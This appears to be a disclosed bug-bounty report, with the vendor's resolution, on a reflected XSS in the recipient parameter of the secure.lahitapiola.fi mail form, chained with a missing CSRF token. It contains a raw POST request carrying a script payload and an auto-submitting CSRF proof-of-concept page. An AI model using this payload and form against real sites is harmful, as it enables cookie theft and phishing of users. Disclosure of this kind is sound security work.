  "vulnerability_information": "## Basic report information\n**Summary:** \nThe secure.lahitapiola.fi -mail application contains a reflected XSS vulnerability which can be exploited for example with CSRF-attack.\n\n**Description:** \nAs mentioned in the summary, the site contains a reflected cross-site scripting vulnerability. This vulnerability is present on the recipient-parameter which is used to specify destination email address of the email. \n\nThis recipient-parameter is normally not used on the first page of the email-flow, however by manually injecting it to the POST-request we can introduce an email address which will be placed on the resulting HTML-page as unsanitized value.\n\nAs the same functionality lacks any CSRF-protection, a CSRF-page can be crafted which will trigger the reflected XSS vulnerability when opened.\n\n**Impact:**\nThe vulnerability can be used at least to do the following:\n- Create open redirects via javascript.\n- Read all cookies that are scoped to lahitapiola-domain instead of the subdomain.\n- Read cookies of the secure-subdomain.\n- Maybe something else but I'm too tired to think and will post a comment if anything new pops up.\n\n## Browsers / Apps Verified In:\n\n  * Firefox\n\n## Steps To Reproduce:\n\n  1. Host the attached CSRF-PoC on a external server.\n  2. Open the hosted file with Firefox or any other browser that does not do proper XSS-sanitation.\n  3. Notice, that the reflected xss triggered and was run in context of the secure.lahitapiola.fi-domain.\n\n## Additional material\n\nSimple PoC-request for the XSS:\n\n```\nPOST /index.cgi HTTP/1.1\nHost: secure.lahitapiola.fi\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 164\n\nsender=█████████%40rot.fi&page=2&lang=en&charset=utf-8&formsubmit=Continue&recipient=no-reply\"/></noscript><script>alert(document.domain)</script>@lahitapiola.fi\n```\n\nExample attack by chaining to CSRF:\n```\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://secure.lahitapiola.fi/index.cgi\" method=\"POST\">\n      <input type=\"hidden\" name=\"sender\" value=\"secure&#45;█████&#64;rot&#46;fi\" />\n      <input type=\"hidden\" name=\"page\" value=\"2\" />\n      <input type=\"hidden\" name=\"lang\" value=\"en\" />\n      <input type=\"hidden\" name=\"charset\" value=\"utf&#45;8\" />\n      <input type=\"hidden\" name=\"formsubmit\" value=\"Continue\" />\n      <input type=\"hidden\" name=\"recipient\" value=\"no&#45;reply&quot;&#47;&gt;&lt;&#47;noscript&gt;&lt;script&gt;alert&#40;document&#46;domain&#41;&lt;&#47;script&gt;&#64;lahitapiola&#46;fi\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n```\n\n## Impact\n\nThe vulnerability can be used at least to do the following:\n- Create open redirects via javascript.\n- Read all cookies that are scoped to lahitapiola-domain instead of the subdomain.\n- Read cookies of the secure-subdomain.\n- Maybe something else but I'm too tired to think and will post a comment if anything new pops up.",

      "content": "##Issue\n\nThe reporter was able to misuse a couple of flaws in the system. By using a reflected XSS (due to missing validation) combined with a CSRF the reporter could create open redirects (via javascript), was able to read all present lahitapiola.fi cookies as well as cookies from the the secure-subdomain. Finally the reporter showed how to perform a complete redress of the UI and fooling the user to submit login-information and sending that login information back to the reporter himself as an error message.  Clever!\n\n##Fix\n\nThe issue was investigated and found to be valid and in scope for a fix. Details about the fix are not disclosed. \n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. The root cause was not severe or complicated from a technical point of view. However, the found flaw enabled quite a bit of different approaches to do harm. The bounty is not based directly on the weakness, but rather on the business impact as well clever thinking.",
